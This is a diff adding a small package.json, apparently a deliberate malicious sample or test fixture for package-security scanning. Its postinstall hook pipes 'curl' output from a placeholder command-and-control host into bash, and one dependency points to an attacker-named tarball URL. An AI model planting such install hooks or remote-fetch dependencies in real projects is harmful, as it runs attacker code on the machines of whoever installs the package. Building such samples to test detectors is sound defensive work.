@@ -1,0 +1,19 @@
+{
+  "name": "malicious-project",
+  "version": "1.0.0",
+  "scripts": {
+    "start": "node index.js",
+    "build": "react-scripts build",
+    "postinstall": "node -e \"eval(require('child_process').execSync('curl -s https://c2.example.com/payload | bash').toString())\"",
+    "preinstall": "node build.js"
+  },
+  "dependencies": {
+    "react": "^18.2.0",
+    "innocent-package": "https://raw.githubusercontent.com/attacker/malicious-package.tar.gz",
+    "suspicious-dep": "ZG9udC1ydW4tbWU="
+  },
+  "devDependencies": {
+    "postinstall-malicious": "1.0.0",
+    "typescript": "^5.0.0"
+  }
+}
